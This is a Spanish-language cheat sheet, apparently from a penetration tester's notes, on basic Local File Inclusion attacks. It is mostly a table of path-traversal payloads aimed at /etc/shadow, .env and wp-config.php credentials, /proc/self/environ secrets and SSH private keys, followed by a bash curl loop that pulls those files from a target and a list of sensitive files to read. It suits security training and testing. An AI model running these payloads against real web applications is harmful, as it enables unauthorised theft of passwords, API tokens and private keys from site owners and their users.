---
aliases:
  - Rutas principales en un LFI
  - proc self fd
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI - Básico

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `../../../../etc/passwd` | Listado de usuarios + UIDs Linux | Probe canónico LFI. |
| `/etc/passwd` | Path absoluto sin traversal | App sin chroot/jail, no requiere `../`. |
| `../../../../../../../etc/passwd` | Más profundidad de la necesaria | Path normaliza `/` final — saturar es seguro. |
| `../../../../etc/shadow` | Hashes de password root + users | Root-only típicamente; útil si webserver corre como root. |
| `../../../../etc/hosts` | Mapeo IP↔hostname interno | Recon de red interna. |
| `../../../../proc/self/cmdline` | Cmdline del proceso webserver | Identificar binario/argumentos del web. |
| `../../../../proc/self/environ` | Variables de entorno del proceso | DB_PASSWORD, tokens — chain con [[LFI To RCE - proc self environ]]. |
| `../../../../proc/version` / `../../../../etc/os-release` | Versión kernel + distro | Recon para kernel exploits. |
| `../../../../var/www/html/config.php` | Source PHP con credenciales DB | App en `/var/www/html`. |
| `../../../../var/www/html/.env` | Credenciales Laravel/Symfony | Stack PHP moderno. |
| `../../../../var/www/html/wp-config.php` | Credenciales WordPress | Stack WordPress. |
| `../../../../home/user/.ssh/id_rsa` | Clave privada SSH | Webserver con permisos de lectura sobre $HOME. |
| `../../../../home/user/.bash_history` | Comandos previos del user | Recon de actividad. |
| `../../../../root/.ssh/id_rsa` | Clave SSH del root | Webserver corre como root (mal config). |
| `C:\Windows\System32\drivers\etc\hosts` | Hosts file Windows | Target Windows. |
| `C:\Windows\win.ini` / `C:\boot.ini` | Files canónicos Windows | Probe Windows. |
| `C:\inetpub\wwwroot\web.config` | Config IIS / ASP.NET | Stack IIS. |
^lfi-basico

### Workflow

```bash
# 1. Probe inicial
TARGET="https://target/index.php?page=PAYLOAD"
curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fetc%2Fpasswd}" | head

# 2. Identificar OS + stack
curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fproc%2Fversion}"
curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fetc%2Fos-release}"
curl -sI https://target | grep -i 'server\|x-powered-by'

# 3. Recon de la app
for f in 'config.php' '.env' 'wp-config.php' 'database.yml' 'settings.py'; do
  echo "=== $f ==="
  curl -s "${TARGET//PAYLOAD/..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2F$f}" | head -10
done

# 4. SSH keys + history
for path in '/home/www-data/.ssh/id_rsa' '/home/ubuntu/.ssh/id_rsa' '/root/.ssh/id_rsa'; do
  curl -s "${TARGET//PAYLOAD/$path}"
done
```

### Lista de archivos sensibles Linux

```
/etc/passwd /etc/shadow /etc/hosts /etc/hostname /etc/resolv.conf
/etc/issue /etc/group /etc/sudoers /etc/crontab
/proc/self/cmdline /proc/self/environ /proc/self/maps /proc/self/status
/proc/version /etc/os-release /etc/lsb-release
/var/log/auth.log /var/log/syslog /var/log/apache2/access.log /var/log/nginx/access.log
/home/*/.ssh/id_rsa /home/*/.bash_history /root/.ssh/id_rsa
```

---

## Overview

LFI básico = `include(user_input)` sin sanitizar permite leer cualquier archivo legible por el webserver. Path traversal (`../`) escapa del directorio "esperado" hasta llegar a root.

Si el filtro reemplaza `../` por vacío → probar variantes en [[LFI - Path Traversal y Bypass de Filtros]]. Si append automático de `.php` corta el path → usar null byte ([[LFI - Null Byte Injection]]) o wrapper `php://filter`.

---
